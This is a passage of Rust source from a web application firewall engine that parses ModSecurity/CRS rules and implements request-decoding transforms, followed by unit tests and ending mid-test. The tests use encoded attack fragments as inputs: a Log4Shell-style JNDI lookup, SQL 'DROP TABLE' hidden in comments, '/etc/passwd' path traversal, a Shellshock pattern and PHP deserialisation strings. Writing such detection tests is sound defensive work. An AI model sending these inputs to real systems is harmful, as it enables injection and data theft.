    let mut ignored_actions: std::collections::BTreeMap<String, usize> =
        std::collections::BTreeMap::new();
    let mut visited = std::collections::HashSet::new();
    if let Some(base) = base_dir {
        if let Ok(canonical) = base.canonicalize() {
            visited.insert(canonical);
        }
    }
    let expanded = expand_includes(contents, base_dir, &mut visited);
    let joined = join_continuations(&expanded);
    let lines: Vec<&str> = joined.lines().map(str::trim).collect();
    let mut i = 0;
    while i < lines.len() {
        let line = lines[i];
        let line_no = i + 1;
        i += 1;
        if line.starts_with("SecRuleEngine ") {
            detection_only = line.contains("DetectionOnly");
            continue;
        }
        if let Some(rest) = line.strip_prefix("SecDefaultAction ") {
            let tokens = tokenize(rest);
            if let Some(actions) = tokens.first() {
                let ParsedActions { action, .. } = parse_actions(actions);
                let phase = if actions.split(',').any(|a| a.trim() == "phase:3") {
                    WafPhase::ResponseHeaders
                } else if actions
                    .split(',')
                    .any(|a| a.trim() == "phase:4" || a.trim() == "phase:5")
                {
                    WafPhase::ResponseBodyChunk
                } else if actions.split(',').any(|a| a.trim() == "phase:2") {
                    WafPhase::RequestBodyComplete
                } else {
                    WafPhase::RequestHeaders
                };
                default_actions.insert(phase, action);
            }
            continue;
        }
        if let Some(label) = line.strip_prefix("SecMarker ") {
            markers.insert(label.trim().to_string(), rules.len());
            continue;
        }
        if let Some(rest) = line.strip_prefix("SecAction ") {
            let tokens = tokenize(rest);
            if let Some(actions) = tokens.first() {
                match parse_action_only(actions) {
                    Ok((rule, ignored)) => {
                        for name in ignored {
                            *ignored_actions.entry(name).or_insert(0) += 1;
                        }
                        rules.push(rule);
                    }
                    Err(Reject::Malformed(reason)) => {
                        discarded += 1;
                        diagnostics.push(format!(
                            "line {line_no}: discarded SecAction (malformed): {reason}"
                        ));
                    }
                    Err(Reject::Unsupported(reason)) => {
                        unsupported += 1;
                        unsupported_diagnostics
                            .push(format!("line {line_no}: unsupported SecAction: {reason}"));
                    }
                }
            }
            continue;
        }
        if let Some(rest) = line.strip_prefix("SecRuleRemoveById ") {
            disabled_ids.extend(
                rest.split_whitespace()
                    .filter_map(|v| v.parse::<u32>().ok()),
            );
            continue;
        }
        if !line.starts_with("SecRule ") {
            continue;
        }
        let (mut rule, ignored, mut chained) =
            match parse_rule_tokens(&tokenize(&line["SecRule ".len()..]), base_dir, false) {
                Ok(parsed) => parsed,
                Err(Reject::Malformed(reason)) => {
                    discarded += 1;
                    diagnostics.push(format!(
                        "line {line_no}: rule {}: discarded SecRule (malformed): {reason}: {}",
                        rule_id_hint(line),
                        truncate_rule_line(line),
                    ));
                    continue;
                }
                Err(Reject::Unsupported(reason)) => {
                    unsupported += 1;
                    unsupported_diagnostics.push(format!(
                        "line {line_no}: rule {}: unsupported SecRule: {reason}",
                        rule_id_hint(line),
                    ));
                    continue;
                }
            };
        for name in ignored {
            *ignored_actions.entry(name).or_insert(0) += 1;
        }
        let mut chain_reject: Option<Reject> = None;
        while chained {
            while i < lines.len() && (lines[i].is_empty() || lines[i].starts_with('#')) {
                i += 1;
            }
            if i >= lines.len() || !lines[i].starts_with("SecRule ") {
                chain_reject = Some(Reject::Malformed("incomplete chain".into()));
                break;
            }
            match parse_rule_tokens(&tokenize(&lines[i]["SecRule ".len()..]), base_dir, true) {
                Ok((next, next_ignored, next_chained)) => {
                    for name in next_ignored {
                        *ignored_actions.entry(name).or_insert(0) += 1;
                    }
                    i += 1;
                    rule.chain.push(next);
                    chained = next_chained;
                }
                Err(reject) => {
                    chain_reject = Some(reject);
                    break;
                }
            }
        }
        if let Some(reject) = chain_reject {
            match reject {
                Reject::Malformed(reason) => {
                    discarded += 1;
                    diagnostics.push(format!(
                        "line {line_no}: rule {}: discarded SecRule with invalid chain: {reason}: {}",
                        rule_id_hint(line),
                        truncate_rule_line(line),
                    ));
                }
                Reject::Unsupported(reason) => {
                    unsupported += 1;
                    unsupported_diagnostics.push(format!(
                        "line {line_no}: rule {}: unsupported SecRule chain member: {reason}",
                        rule_id_hint(line),
                    ));
                }
            }
            continue;
        }
        if !rule.explicit_action {
            let phase = if rule.phases.contains(&WafPhase::RequestHeaders) {
                WafPhase::RequestHeaders
            } else if rule.phases.contains(&WafPhase::ResponseHeaders) {
                WafPhase::ResponseHeaders
            } else if rule.phases.contains(&WafPhase::ResponseBodyChunk) {
                WafPhase::ResponseBodyChunk
            } else {
                WafPhase::RequestBodyComplete
            };
            if let Some(action) = default_actions.get(&phase) {
                rule.action = *action;
            }
        }
        rules.push(rule);
    }
    CrsRulesetInput {
        id: id.to_string(),
        enabled: true,
        inbound_threshold,
        detection_only,
        disabled_ids,
        markers,
        default_actions,
        rules,
        discarded,
        diagnostics,
        unsupported,
        unsupported_diagnostics,
        ignored_actions: ignored_actions.into_iter().collect(),
    }
}

/// Best-effort `id:NNN` extracted from a raw rule line, for diagnostics that
/// are truncated before the action list is reached.
fn rule_id_hint(line: &str) -> String {
    let Some(pos) = line.find("id:") else {
        return "unknown".into();
    };
    let digits: String = line[pos + 3..]
        .chars()
        .take_while(|c| c.is_ascii_digit())
        .collect();
    if digits.is_empty() {
        "unknown".into()
    } else {
        digits
    }
}

fn truncate_rule_line(line: &str) -> String {
    const MAX: usize = 160;
    let mut out: String = line.chars().take(MAX).collect();
    if line.chars().count() > MAX {
        out.push('…');
    }
    out
}

/// Parse an `application/x-www-form-urlencoded` body into name/value pairs.
pub(crate) fn form_pairs(body: &[u8]) -> Vec<(String, String)> {
    String::from_utf8_lossy(body)
        .split('&')
        .filter(|pair| !pair.is_empty())
        .map(|pair| {
            let (name, value) = pair.split_once('=').unwrap_or((pair, ""));
            (url_decode(name, true), url_decode(value, true))
        })
        .collect()
}

pub(crate) fn url_decode(value: &str, plus_space: bool) -> String {
    let bytes = value.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 5 < bytes.len() && matches!(bytes[i + 1], b'u' | b'U') => {
                let hex = std::str::from_utf8(&bytes[i + 2..i + 6]).ok();
                if let Some(code) = hex.and_then(|h| u32::from_str_radix(h, 16).ok()) {
                    if let Some(ch) = char::from_u32(code) {
                        out.extend_from_slice(ch.encode_utf8(&mut [0; 4]).as_bytes());
                        i += 6;
                        continue;
                    }
                }
                out.push(bytes[i]);
                i += 1;
            }
            b'%' if i + 2 < bytes.len() => {
                let hex = std::str::from_utf8(&bytes[i + 1..i + 3]).ok();
                if let Some(byte) = hex.and_then(|h| u8::from_str_radix(h, 16).ok()) {
                    out.push(byte);
                    i += 3;
                } else {
                    out.push(bytes[i]);
                    i += 1;
                }
            }
            b'+' if plus_space => {
                out.push(b' ');
                i += 1;
            }
            byte => {
                out.push(byte);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).to_string()
}

fn html_decode(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    let mut rest = value;
    while let Some(pos) = rest.find('&') {
        out.push_str(&rest[..pos]);
        let tail = &rest[pos..];
        let Some(end) = tail.find(';').filter(|end| *end <= 12) else {
            out.push('&');
            rest = &tail[1..];
            continue;
        };
        let entity = &tail[1..end];
        let decoded = match entity.to_ascii_lowercase().as_str() {
            "lt" => Some('<'),
            "gt" => Some('>'),
            "quot" => Some('"'),
            "apos" => Some('\''),
            "amp" => Some('&'),
            "dollar" => Some('$'),
            "lbrace" | "lcub" => Some('{'),
            "rbrace" | "rcub" => Some('}'),
            "lpar" => Some('('),
            "rpar" => Some(')'),
            "percnt" => Some('%'),
            "colon" => Some(':'),
            "sol" => Some('/'),
            "bsol" => Some('\\'),
            "semi" => Some(';'),
            "nbsp" => Some(' '),
            _ => entity
                .strip_prefix("#x")
                .or_else(|| entity.strip_prefix("#X"))
                .and_then(|hex| u32::from_str_radix(hex, 16).ok())
                .or_else(|| entity.strip_prefix('#').and_then(|dec| dec.parse().ok()))
                .and_then(char::from_u32),
        };
        match decoded {
            Some(ch) => out.push(ch),
            None => out.push_str(&tail[..=end]),
        }
        rest = &tail[end + 1..];
    }
    out.push_str(rest);
    out
}

fn replace_comments(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    let mut rest = value;
    while let Some(start) = rest.find("/*") {
        out.push_str(&rest[..start]);
        let tail = &rest[start + 2..];
        let Some(end) = tail.find("*/") else {
            out.push_str(&rest[start..]);
            return out;
        };
        out.push(' ');
        rest = &tail[end + 2..];
    }
    out.push_str(rest);
    out
}

fn hex_value(bytes: &[u8], start: usize, len: usize) -> Option<u32> {
    let end = start + len;
    if end > bytes.len() {
        return None;
    }
    u32::from_str_radix(std::str::from_utf8(&bytes[start..end]).ok()?, 16).ok()
}

fn js_decode(value: &str) -> String {
    let bytes = value.as_bytes();
    let mut out = String::with_capacity(value.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 1 < bytes.len() {
            match bytes[i + 1] {
                b'x' => {
                    if let Some(code) = hex_value(bytes, i + 2, 2) {
                        out.push(char::from_u32(code).unwrap_or('\u{fffd}'));
                        i += 4;
                        continue;
                    }
                }
                b'u' => {
                    if let Some(code) = hex_value(bytes, i + 2, 4) {
                        out.push(char::from_u32(code).unwrap_or('\u{fffd}'));
                        i += 6;
                        continue;
                    }
                }
                b'n' => {
                    out.push('\n');
                    i += 2;
                    continue;
                }
                b'r' => {
                    out.push('\r');
                    i += 2;
                    continue;
                }
                b't' => {
                    out.push('\t');
                    i += 2;
                    continue;
                }
                b'\\' | b'\'' | b'"' => {
                    out.push(bytes[i + 1] as char);
                    i += 2;
                    continue;
                }
                _ => {}
            }
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

fn css_decode(value: &str) -> String {
    let bytes = value.as_bytes();
    let mut out = String::with_capacity(value.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 1 < bytes.len() {
            let mut len = 0;
            while len < 6 && i + 1 + len < bytes.len() && bytes[i + 1 + len].is_ascii_hexdigit() {
                len += 1;
            }
            if len > 0 {
                if let Some(code) = hex_value(bytes, i + 1, len) {
                    out.push(char::from_u32(code).unwrap_or('\u{fffd}'));
                    i += 1 + len;
                    if i < bytes.len() && bytes[i] == b' ' {
                        i += 1;
                    }
                    continue;
                }
            }
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

fn escape_seq_decode(value: &str) -> String {
    let bytes = value.as_bytes();
    let mut out = String::with_capacity(value.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 1 < bytes.len() {
            if bytes[i + 1] == b'x' {
                if let Some(code) = hex_value(bytes, i + 2, 2) {
                    out.push(char::from_u32(code).unwrap_or('\u{fffd}'));
                    i += 4;
                    continue;
                }
            }
            if bytes[i + 1].is_ascii_digit() {
                let mut len = 0;
                while len < 3 && i + 1 + len < bytes.len() && bytes[i + 1 + len].is_ascii_digit() {
                    len += 1;
                }
                if let Some(code) = std::str::from_utf8(&bytes[i + 1..i + 1 + len])
                    .ok()
                    .and_then(|digits| u32::from_str_radix(digits, 8).ok())
                {
                    out.push(char::from_u32(code).unwrap_or('\u{fffd}'));
                    i += 1 + len;
                    continue;
                }
            }
            if bytes[i + 1] == b'n' {
                out.push('\n');
                i += 2;
                continue;
            }
            if bytes[i + 1] == b't' {
                out.push('\t');
                i += 2;
                continue;
            }
            if bytes[i + 1] == b'r' {
                out.push('\r');
                i += 2;
                continue;
            }
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

/// ModSecurity `t:cmdLine`: lowercase, drop quotes/carets, collapse
/// whitespace, and drop the space before `/` or `(`. CRS 930110/930120 need
/// the backslash and semicolon to survive: the reference matches `..\` and
/// `..;` in ARGS, so they are not whitespace or stripped characters.
fn cmd_line(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    let mut space = false;
    for ch in value.chars() {
        match ch {
            '"' | '\'' | '^' => {}
            ' ' | '\t' | '\r' | '\n' => {
                if !space {
                    out.push(' ');
                    space = true;
                }
            }
            '/' | '(' => {
                if space {
                    out.pop();
                }
                space = false;
                out.push(ch);
            }
            other => {
                out.push(other.to_ascii_lowercase());
                space = false;
            }
        }
    }
    out
}

/// ModSecurity `t:utf8toUnicode`: replace every non-ASCII code point with its
/// `%u` form (lowercase hex, padded to at least four digits), exactly as
/// `utf8_to_unicode.cc` does for a valid UTF-8 input.
fn utf8_to_unicode(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 8);
    for ch in value.chars() {
        let code = ch as u32;
        if code < 0x80 {
            out.push(ch);
        } else {
            out.push_str(&format!("%u{code:04x}"));
        }
    }
    out
}

/// ModSecurity `t:normalizePathWin`: port of `normalise_path.cc` with
/// `win = true` (backslashes become separators, `.`/`..` are resolved and the
/// result never escapes the root).
fn normalize_path_win(value: &str) -> String {
    let input = value.as_bytes();
    if input.is_empty() {
        return String::new();
    }
    let mut buf = input.to_vec();
    let end = buf.len() - 1;
    let relative = !(buf[0] == b'/' || buf[0] == b'\\');
    let trailing = buf[end] == b'/' || buf[end] == b'\\';
    let mut hitroot = false;
    let mut done = false;
    let mut src = 0usize;
    let mut dst = 0usize;
    while !done && src <= end && dst <= end {
        // Windows: backslashes are separators too.
        if buf[src] == b'\\' {
            buf[src] = b'/';
        }
        if src < end && buf[src + 1] == b'\\' {
            buf[src + 1] = b'/';
        }
        let mut copy = true;
        if src == end {
            done = true;
        } else if buf[src + 1] != b'/' {
            // Mid-segment: nothing to normalize.
        } else if buf[src] == b'/' {
            // Empty segment: the copy step collapses consecutive slashes.
        } else if buf[src] == b'.' {
            if dst > 0 && buf[dst - 1] == b'.' {
                // `..` back-reference.
                if relative && (hitroot || dst <= 2) {
                    hitroot = true;
                } else {
                    let mut d = dst as isize - 3;
                    while d > 0 && buf[d as usize] != b'/' {
                        d -= 1;
                    }
                    if d <= 0 {
                        hitroot = true;
                        dst = 0;
                        if !relative && src == end {
                            dst = 1;
                        }
                    } else {
                        dst = d as usize;
                    }
                    if done {
                        copy = false;
                    } else {
                        src += 1;
                    }
                }
            } else if dst == 0 {
                // `.` at the root: drop it.
                if done {
                    copy = false;
                } else {
                    src += 1;
                }
            } else if buf[dst - 1] == b'/' {
                // `./` self-reference: drop the dot.
                if done {
                    copy = false;
                } else {
                    dst -= 1;
                    src += 1;
                }
            }
        } else if dst > 0 {
            hitroot = false;
        }
        if copy {
            if buf[src] == b'/' {
                while src < end && (buf[src + 1] == b'/' || buf[src + 1] == b'\\') {
                    src += 1;
                }
                if relative && dst == 0 {
                    src += 1;
                    continue;
                }
            }
            buf[dst] = buf[src];
            dst += 1;
            src += 1;
        }
    }
    if !trailing && dst > 0 && buf[dst - 1] == b'/' {
        dst -= 1;
    }
    String::from_utf8_lossy(&buf[..dst]).to_string()
}

/// ModSecurity `t:removeCommentsChar`: drop `/*`, `*/`, `<!--`, `-->`, `--`
/// and `#` markers, keeping the remaining bytes untouched.
fn remove_comments_char(value: &str) -> String {
    let bytes = value.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if i + 1 < bytes.len()
            && ((bytes[i] == b'/' && bytes[i + 1] == b'*')
                || (bytes[i] == b'*' && bytes[i + 1] == b'/'))
        {
            i += 2;
        } else if i + 3 < bytes.len() && &bytes[i..i + 4] == b"<!--" {
            i += 4;
        } else if i + 2 < bytes.len() && &bytes[i..i + 3] == b"-->" {
            i += 3;
        } else if i + 1 < bytes.len() && bytes[i] == b'-' && bytes[i + 1] == b'-' {
            i += 2;
        } else if bytes[i] == b'#' {
            i += 1;
        } else {
            out.push(bytes[i]);
            i += 1;
        }
    }
    String::from_utf8_lossy(&out).to_string()
}

/// ModSecurity `t:sha1`: replace the value with the raw 20-byte SHA-1 digest.
///
/// The transform pipeline is text, so each digest byte is carried as the code
/// point of the same value; `hexEncode` maps those code points back to the
/// original bytes (CRS 901410/901320 use `t:sha1,t:hexEncode`).
fn sha1_digest(value: &str) -> String {
    use sha1::Digest;
    sha1::Sha1::digest(value.as_bytes())
        .iter()
        .map(|byte| char::from(*byte))
        .collect()
}

pub(crate) fn apply_transforms(value: &str, transforms: &[CrsTransform]) -> String {
    let mut out = value.to_string();
    for transform in transforms {
        out = match transform {
            CrsTransform::Lowercase => out.to_ascii_lowercase(),
            CrsTransform::UrlDecode => url_decode(&out, true),
            CrsTransform::UrlDecodeUni => url_decode(&out, false),
            CrsTransform::Trim => out.trim().to_string(),
            CrsTransform::RemoveNulls => out.replace('\0', ""),
            CrsTransform::Base64Decode => base64::engine::general_purpose::STANDARD
                .decode(out.as_bytes())
                .map(|bytes| String::from_utf8_lossy(&bytes).to_string())
                .unwrap_or(out),
            CrsTransform::HtmlEntityDecode => html_decode(&out),
            CrsTransform::RemoveWhitespace => out.chars().filter(|c| !c.is_whitespace()).collect(),
            CrsTransform::CompressWhitespace => {
                out.split_whitespace().collect::<Vec<_>>().join(" ")
            }
            CrsTransform::NormalizePath => {
                // ModSecurity's normalizePath drops Unix backslash escapes:
                // 932160 transforms `cat /etc/pa\ssw\d` to `cat/etc/passwd`.
                // Replacing them with `/` produces `cat/etc/pa/ssw/d` and
                // misses the `etc/passwd` phrase from unix-shell.data.
                let mut normalized = out.replace('\\', "");
                while normalized.contains("//") {
                    normalized = normalized.replace("//", "/");
                }
                normalized
            }
            CrsTransform::HexDecode => {
                let bytes = out.as_bytes();
                let mut decoded = Vec::with_capacity(bytes.len() / 2);
                let mut i = 0;
                while i + 1 < bytes.len() {
                    let pair = std::str::from_utf8(&bytes[i..i + 2]).ok();
                    match pair.and_then(|p| u8::from_str_radix(p, 16).ok()) {
                        Some(byte) => {
                            decoded.push(byte);
                            i += 2;
                        }
                        None => {
                            decoded.push(bytes[i]);
                            i += 1;
                        }
                    }
                }
                if i < bytes.len() {
                    decoded.push(bytes[i]);
                }
                String::from_utf8_lossy(&decoded).to_string()
            }
            CrsTransform::Length => out.chars().count().to_string(),
            CrsTransform::HexEncode => {
                // A byte-level digest (see `sha1_digest`) is carried as the
                // code point of each byte, so code points up to U+00FF map back
                // to exactly one byte; anything above keeps its UTF-8 bytes.
                let mut hex = String::with_capacity(out.len() * 2);
                for ch in out.chars() {
                    let code = ch as u32;
                    if code <= 0xFF {
                        hex.push_str(&format!("{code:02x}"));
                    } else {
                        for byte in ch.to_string().bytes() {
                            hex.push_str(&format!("{byte:02x}"));
                        }
                    }
                }
                hex
            }
            CrsTransform::JsDecode => js_decode(&out),
            CrsTransform::CssDecode => css_decode(&out),
            CrsTransform::Base64DecodeExt => {
                let engine = &base64::engine::general_purpose::STANDARD;
                let url = &base64::engine::general_purpose::URL_SAFE;
                let url_nopad = &base64::engine::general_purpose::URL_SAFE_NO_PAD;
                engine
                    .decode(out.as_bytes())
                    .or_else(|_| url.decode(out.as_bytes()))
                    .or_else(|_| url_nopad.decode(out.as_bytes()))
                    .map(|bytes| String::from_utf8_lossy(&bytes).to_string())
                    .unwrap_or(out)
            }
            CrsTransform::EscapeSeqDecode => escape_seq_decode(&out),
            CrsTransform::ReplaceComments => replace_comments(&out),
            CrsTransform::CmdLine => cmd_line(&out),
            CrsTransform::Utf8ToUnicode => utf8_to_unicode(&out),
            CrsTransform::NormalizePathWin => normalize_path_win(&out),
            CrsTransform::RemoveCommentsChar => remove_comments_char(&out),
            CrsTransform::Sha1 => sha1_digest(&out),
        };
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn transforms_decode_numeric_entities_and_replace_comments() {
        assert_eq!(
            apply_transforms("&#x24;&#36;&lbrace;jndi", &[CrsTransform::HtmlEntityDecode]),
            "$${jndi"
        );
        assert_eq!(
            apply_transforms(
                "%24%7B%u0073%u0079%u0073%74%65%6D",
                &[CrsTransform::UrlDecode]
            ),
            "${system"
        );
        assert_eq!(
            apply_transforms(";DROP/*test*/TABLE", &[CrsTransform::ReplaceComments]),
            ";DROP TABLE"
        );
        assert_eq!(
            apply_transforms("while(!+0)", &[CrsTransform::UrlDecodeUni]),
            "while(!+0)"
        );
        assert_eq!(
            apply_transforms("while(!+0)", &[CrsTransform::UrlDecode]),
            "while(! 0)"
        );
    }

    #[test]
    fn cookie_without_value_is_scanned_by_name() {
        use exyonq_waf_api::{WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let ruleset = parse_rule_file(
            "crs",
            "SecRule REQUEST_COOKIES_NAMES \"@rx ^evil$\" \"id:1,phase:1,block\"\n",
            5,
        );
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
        let snapshot = crate::compile::compile_waf_with_crs(input, &[ruleset]).unwrap();
        let engine = crate::FixedWafEngine::from_snapshot(std::sync::Arc::new(snapshot));
        let headers = crate::MapHeaders::from_pairs(&[("cookie", "evil")]);
        let req = WafRequest {
            country: None,
            method: "GET",
            host: None,
            path: "/",
            query: None,
            headers: &headers,
            client_ip: IpAddr::V4(Ipv4Addr::LOCALHOST),
            route_id: None,
        };
        let decision = engine.inspect(WafPhase::RequestHeaders, &req);
        assert!(
            decision
                .violations
                .iter()
                .any(|violation| violation.rule_id.as_str() == "1"),
            "cookie name was not scanned: {:?}",
            decision.violations
        );
    }

    #[test]
    fn utf8_to_unicode_matches_modsecurity_semantics() {
        // 2/3/4-byte UTF-8 sequences become %uXXXX with lowercase hex and at
        // least four digits (ModSecurity utf8_to_unicode.cc).
        assert_eq!(
            apply_transforms("ascii", &[CrsTransform::Utf8ToUnicode]),
            "ascii"
        );
        assert_eq!(
            apply_transforms("é", &[CrsTransform::Utf8ToUnicode]),
            "%u00e9"
        );
        assert_eq!(
            apply_transforms("€", &[CrsTransform::Utf8ToUnicode]),
            "%u20ac"
        );
        assert_eq!(
            apply_transforms("😀", &[CrsTransform::Utf8ToUnicode]),
            "%u1f600"
        );
    }

    #[test]
    fn normalize_path_win_matches_modsecurity_semantics() {
        assert_eq!(
            apply_transforms("/foo//bar", &[CrsTransform::NormalizePathWin]),
            "/foo/bar"
        );
        assert_eq!(
            apply_transforms("/foo/./bar/../baz", &[CrsTransform::NormalizePathWin]),
            "/foo/baz"
        );
        assert_eq!(
            apply_transforms("C:\\Windows\\System32", &[CrsTransform::NormalizePathWin]),
            "C:/Windows/System32"
        );
        assert_eq!(
            apply_transforms("/../../etc/passwd", &[CrsTransform::NormalizePathWin]),
            "/etc/passwd"
        );
    }

    #[test]
    fn remove_comments_char_strips_markers() {
        assert_eq!(
            apply_transforms("a/*b*/c<!--d-->e--f#g", &[CrsTransform::RemoveCommentsChar]),
            "abcdefg"
        );
    }

    #[test]
    fn sha1_then_hex_encode_matches_the_digest() {
        // RFC 3174 test vector; CRS 901410/901320 use t:sha1,t:hexEncode.
        assert_eq!(
            apply_transforms("abc", &[CrsTransform::Sha1, CrsTransform::HexEncode]),
            "a9993e364706816aba3e25717850c26c9cd0d89d"
        );
    }

    #[test]
    fn negated_collection_targets_map_to_except_variants() {
        let crs = parse_rule_file(
            "t",
            "SecRule ARGS|!ARGS_NAMES:/^x$/|!REQUEST_COOKIES:/_pk_ref/|!REQUEST_COOKIES_NAMES:/^a/ \"@contains x\" \"id:1,deny\"\n",
            5,
        );
        assert_eq!(crs.discarded, 0, "{:?}", crs.diagnostics);
        assert_eq!(crs.unsupported, 0, "{:?}", crs.unsupported_diagnostics);
        let targets = &crs.rules[0].targets;
        assert!(targets.contains(&CrsTarget::ArgNameExcept("^x$".into())));
        assert!(targets.contains(&CrsTarget::CookieNamedExcept("_pk_ref".into())));
        assert!(targets.contains(&CrsTarget::CookieNameNamedExcept("^a".into())));
    }

    #[test]
    fn crs_chain_with_sha1_and_conditional_collections_loads() {
        // The CRS 901320 three-rule chain: conditional collections, sha1 and
        // an initcol action this engine reports but does not model.
        let rules = "SecRule &TX:ENABLE_DEFAULT_COLLECTIONS \"@eq 1\" \"id:901320,phase:1,pass,nolog,chain\"\n    SecRule TX:ENABLE_DEFAULT_COLLECTIONS \"@eq 1\" \"chain\"\n        SecRule TX:ua_hash \"@unconditionalMatch\" \"t:none,t:sha1,t:hexEncode,initcol:global=global\"\n";
        let crs = parse_rule_file("t", rules, 5);
        assert_eq!(crs.discarded, 0, "{:?}", crs.diagnostics);
        assert_eq!(crs.unsupported, 0, "{:?}", crs.unsupported_diagnostics);
        assert_eq!(crs.rules.len(), 1);
        assert_eq!(crs.rules[0].chain.len(), 2);
        assert!(
            crs.ignored_actions
                .iter()
                .any(|(name, _)| name == "initcol"),
            "{:?}",
            crs.ignored_actions
        );
    }

    #[test]
    fn cmd_line_matches_modsecurity_semantics() {
        // ModSecurity transformations/cmd_line.cc: collapse whitespace, drop
        // the space before `/` or `(`, drop quotes/backslashes/carets, lower.
        assert_eq!(
            apply_transforms(
                "for %variable in (set) do command",
                &[CrsTransform::CmdLine]
            ),
            "for %variable in(set) do command"
        );
        assert_eq!(
            apply_transforms("ECHO A ; B , C", &[CrsTransform::CmdLine]),
            "echo a ; b , c"
        );
        assert_eq!(
            apply_transforms("C:\\Windows\\System32", &[CrsTransform::CmdLine]),
            "c:\\windows\\system32"
        );
        assert_eq!(
            apply_transforms("..\\pineapple", &[CrsTransform::CmdLine]),
            "..\\pineapple"
        );
        assert_eq!(
            apply_transforms("..;.\\.;\\.", &[CrsTransform::CmdLine]),
            "..;.\\.;\\."
        );
    }

    #[test]
    fn chain_member_is_parsed() {
        let ruleset = parse_rule_file(
            "chain",
            "SecRule REQUEST_HEADERS_NAMES \"@rx ^.*$\" \"id:1,phase:1,pass,capture,setvar:'tx.x=/%{tx.0}/',chain\"\n\
             SecRule TX:/^x/ \"@rx .*\" \"deny,status:403\"\n",
            5,
        );
        assert_eq!(ruleset.rules.len(), 1);
        assert_eq!(ruleset.rules[0].chain.len(), 1);
    }

    #[test]
    fn pcre_literal_brace_and_redundant_escape_semantics() {
        // CRS 933170 / 941380 / 932170: PCRE treats `{` as literal when it is
        // not a valid quantifier and allows escaped punctuation such as `\&`.
        // These are the six CRS patterns that fall back to fancy-regex.
        let cases: [(&str, &[&str], &[&str]); 3] = [
            (
                r#"[oOcC]:\d+:".+?":\d+:{.*}"#,
                &[r#"O:8:"stdClass":0:{}"#, r#"o:1:"a":2:{s:1:"b";i:1;}"#],
                &["O:8:stdClass:0:{}", "plain"],
            ),
            (r"^\(\s*\)\s+{", &["() {", "()  {"], &["()", "() x"]),
            (r"{{.*?}}", &["{{x}}", "a{{b}}c"], &["{x}", "abc"]),
        ];
        for (pattern, matching, not_matching) in cases {
            let re = fancy_regex::Regex::new(pattern).expect("pattern must compile");
            for value in matching {
                assert!(
                    re.is_match(value).unwrap_or(false),
                    "PCRE should match {pattern:?} against {value:?}"
                );
            }
            for value in not_matching {
                assert!(
                    !re.is_match(value).unwrap_or(false),
                    "PCRE should not match {pattern:?} against {value:?}"
                );
            }
        }
        let escaped = fancy_regex::Regex::new(r"^[^:\(\)\&\|\!\<\>\~]*").expect("escapes");
        assert!(escaped.is_match("abc&def").unwrap_or(false));
    }

    #[test]
    fn debug_missing_crs_rules() {
        // Prefer the same pinned CRS checkout used by the OL-05 gate. Keep the
        // old /tmp fixture for ad-hoc debugging only.
        let env_dir = std::env::var("EXYONQ_CRS_DIR").ok();
        let (base, contents, files) = if let Some(dir) = env_dir {
            let base = std::path::PathBuf::from(dir);
            let setup = base.join("crs-setup.conf.example");
            if !setup.exists() {
                return;
            }
            let mut contents = std::fs::read_to_string(&setup).unwrap();
            let mut files = 1usize;
            let mut rules: Vec<_> = std::fs::read_dir(base.join("rules"))
                .unwrap()
                .filter_map(|entry| entry.ok().map(|entry| entry.path()))
                .filter(|path| path.extension().is_some_and(|ext| ext == "conf"))
                .collect();
            rules.sort();
            for path in rules {
                contents.push_str(&std::fs::read_to_string(path).unwrap());
                contents.push('\n');
                files += 1;
            }
            (base, contents, files)
        } else {
            let path = std::path::Path::new("/tmp/crs-real/main.conf");
            if !path.exists() {
                return;
            }
            (
                path.parent().unwrap().to_path_buf(),
                std::fs::read_to_string(path).unwrap(),
                1,
            )
        };
        let ruleset = parse_rule_file_with_base("crs", &contents, 5, Some(&base));
        let parsed: std::collections::HashSet<String> =
            ruleset.rules.iter().map(|rule| rule.id.clone()).collect();
        let mut visited = std::collections::HashSet::new();
        let expanded = expand_includes(&contents, Some(&base), &mut visited);
        let joined = join_continuations(&expanded);
        let mut all = Vec::new();
        for line in joined.lines() {
            let line = line.trim();
            if !line.starts_with("SecRule ") {
                continue;
            }
            let tokens = tokenize(&line["SecRule ".len()..]);
            if tokens.len() < 3 {
                continue;
            }
            if let Some(id) = tokens[2]
                .split(',')
                .find_map(|action| action.trim().strip_prefix("id:"))
            {
                all.push((id.to_string(), line.chars().take(240).collect::<String>()));
            }
        }
        let missing = all.iter().filter(|(id, _)| !parsed.contains(id)).count();
        eprintln!(
            "FILES={} ALL={} PARSED={} MISSING={}",
            files,
            all.len(),
            parsed.len(),
            missing
        );
        for (id, line) in all {
            if !parsed.contains(&id) {
                eprintln!("MISSING {} {}", id, line);
            }
        }
    }

    #[test]
    fn include_expands_glob_and_data_paths() {
        use exyonq_waf_api::{EmptyHeaders, WafEngine, WafMode, WafPhase, WafRequest};
        use std::net::{IpAddr, Ipv4Addr};
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir(dir.path().join("rules")).unwrap();
        std::fs::write(
            dir.path().join("rules/a.conf"),
            "SecRule ARGS \"@pmFromFile scanners.data\" \"id:9701,deny\"\n",
        )
        .unwrap();
        std::fs::write(dir.path().join("rules/scanners.data"), "includedscanner\n").unwrap();
        let ruleset =
            parse_rule_file_with_base("crs", "Include rules/*.conf\n", 0, Some(dir.path()));
        assert_eq!(ruleset.rules.len(), 1);
        let input = crate::compile::WafCompileInput {
            mode: WafMode::Block,
            ..Default::default()
        };
